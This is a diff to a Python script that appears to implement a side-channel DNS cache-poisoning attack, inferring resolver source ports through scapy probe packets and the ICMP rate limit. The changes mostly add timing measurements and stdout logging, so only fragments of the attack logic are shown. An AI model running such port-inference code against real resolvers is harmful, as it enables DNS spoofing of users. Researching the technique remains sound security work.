@@ -99,50 +99,19 @@ def initialize():
     #print (local_free_ip)
     print (len(local_free_ip))
 
-
-'''
-def step1(thread_id):
-    try:
-        
-        #print("thread id: " + str(thread_id))
-        print(domain_name)
-
-        # making our dns forwarder to be used for upstream dns server
-        my_resolver = dns.resolver.Resolver()
-        my_resolver.nameservers = [forwarder_ip]
-
-        lock.acquire();
-        #print("lock acquired from thread : " + str(thread_id))
-
-        result = my_resolver.resolve(domain_name, 'A')
-        #print("found actual response from thread : " + str(thread_id))
+class Logger(object):
+    def __init__(self):
+        self.terminal = sys.stdout
+        filehandle = open("logfile.log", "w")
+        filehandle.close()
     
-        # this is a dns.resolver.Answer object without the __dict__ command
-        print(result.__dict__)
-        print(result.response)
-
-        #for printing the ip address of the query
-        
-        #for ipval in result:
-        #    print ('IP', ipval.to_text())
-        
-
-    except dns.exception.Timeout:
-        print ("Timeout on DNS query.")
-    except dns.resolver.NXDOMAIN:
-        print ("The query name does not exist.")
-    except dns.resolver.NoNameservers:
-        print ("No nameservers were able to answer the query")
-    except dns.resolver.NoAnswer:
-        print ("Query name exists, but has no RRset")
-    except dns.resolver.YXDOMAIN:
-        print ("Query name is too long")
-
-    lock.release()
-    #print("released lock from thread : " + str(thread_id))
-
-    return
-'''
+    def write(self, message):
+        with open("logfile.log", "a", encoding='utf-8') as self.log:
+            self.log.write(message)
+        self.terminal.write(message)
+    
+    def flush(self):
+        pass
 
 def step1(thread_id):
     
@@ -171,6 +140,8 @@ def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding
     #print("Sleeping for 50ms")
     time.sleep(0.05)
 
+    start_time = time.process_time()
+
     now_port = port_start
 
     # generate all probe packets, padding_packets (if any) and the verification packet first
@@ -198,13 +169,26 @@ def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding
     udp_layer = UDP(dport=1, sport=RandShort())
     verification_packet = ip_layer / udp_layer
 
-    
+    elapsed_time = time.process_time() - start_time
+    print ("Time needed for generating packets: " + str(elapsed_time))
+
+
+    start_time = time.process_time()
     for packet in probe_packet:
         send(packet, verbose=False)
     for packet in padding_packet:
         send(packet, verbose=False)
+    elapsed_time = time.process_time() - start_time
+    print ("Time needed for sending 50 packets: " + str(elapsed_time))
+
     #print("Sending verification packet")
+
+    start_time = time.process_time()
+    # This timeout is the crucial factor
+    # This is taking the majority of time of this function
     reply = sr1(verification_packet, timeout=1, verbose=False) # in seconds
+    elapsed_time = time.process_time() - start_time
+    print ("Time needed for sending and receiving verification packet: " + str(elapsed_time))
     #print("Got reply from verificaiton packet")
     #print (reply.show())
 
@@ -270,6 +254,7 @@ def step2(thread_id, source_port_range_start, source_port_range_end):
         #for system wide time count + sleep also
         #another option was time.process_time() (check)
         start_time_one_chunk = time.perf_counter()
+        start_time = time.process_time()
         
         #print("Calling do_one_attack_chunk")
         ret = do_one_chunk_of_attack(start, ICMP_limit_rate, 0)
@@ -287,11 +272,15 @@ def step2(thread_id, source_port_range_start, source_port_range_end):
 
         
         end_time_one_chunk = time.perf_counter()
+        end_time = time.process_time()
         time_elapsed_for_one_chunk = end_time_one_chunk - start_time_one_chunk
+        time_elapsed = end_time - start_time
+
         #if (time_elapsed_for_one_chunk < ICMP_recovering_time)
         #    time.sleep(ICMP_recovering_time - time_elapsed_for_one_chunk)
         print ("System wide time needed in this loop: " + str(time_elapsed_for_one_chunk))
-        
+        print ("Process wide time needed in this loop: " + str(time_elapsed))
+
         start += ICMP_limit_rate
 
     print_profile_data()
@@ -302,10 +291,14 @@ def step2(thread_id, source_port_range_start, source_port_range_end):
 def main():
 
     initialize()
+
+    sys.stdout = Logger()
     
     iteration = 1
 
     while finished == 0:
+
+        print ("----------Iteration " + str(iteration) + " is starting.----------")
 
         t1 = threading.Thread(target=step1, args=(2 * iteration - 1, ))
         t1.start()
@@ -315,7 +308,7 @@ def main():
         t1.join()
         t2.join()
         
-        print ("Iteration " + str(iteration) + " is completed.")
+        print ("----------Iteration " + str(iteration) + " is completed.----------")
 
         iteration += 1
 
